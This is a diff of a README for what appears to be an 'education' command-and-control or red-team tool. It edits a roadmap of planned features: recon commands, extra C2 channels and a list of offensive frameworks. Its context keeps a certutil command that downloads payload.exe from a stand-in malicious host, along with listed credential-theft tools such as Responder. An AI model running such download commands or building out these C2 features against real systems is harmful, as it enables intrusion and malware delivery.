@@ -40,8 +40,6 @@ This repository serves as a Education reference and contains the implementation 
 
 ## In The Works
 
-- View installed Software (wmic product get Name,Version,Vendor)
-- View all users (wmic useraccount get Name,FullName,Status)
 - Additional communication channels (https, http2, web socket, udp dgram)
    ```js
    // http2
@@ -69,7 +67,7 @@ This repository serves as a Education reference and contains the implementation 
    server.on('message', (msg, rinfo) => {
       console.log(`server got: ${msg} from ${rinfo.address}:${rinfo.port}`);
    });
-- More LOLBas commands
+- Add more LOLBas commands
    ```bash
    # 1. certutil.exe for Downloading Files
    certutil.exe -urlcache -split -f http://malicious-url/payload.exe C:\Windows\Temp\payload.exe
@@ -129,11 +127,3 @@ Other ideas and things on the back burner:
 - Nmap: A powerful network scanner used for host discovery, port scanning, and service enumeration.
 - enum4linux: Enumerates information from Windows and Samba systems, such as shares, users, groups, policies, and more.
 - Responder: Listens for and captures NetNTLMv1/v2 authentication requests, used for credential theft.
-
-- Exploitation Frameworks: Frameworks used to exploit vulnerabilities and gain unauthorized access.
-- Metasploit Framework: A popular exploitation framework that includes a large collection of exploits, payloads, and post-exploitation modules.
-- Empire: A post-exploitation framework that allows attackers to maintain persistence, escalate privileges, and exfiltrate data.
-
-- Privilege Escalation Tools: Tools and techniques used to escalate privileges on compromised systems.
-- PowerUp: PowerShell script that checks for common Windows privilege escalation vectors.
-- Windows Exploit Suggester: Python script that suggests potential exploits for Windows systems based on OS version and patch level.
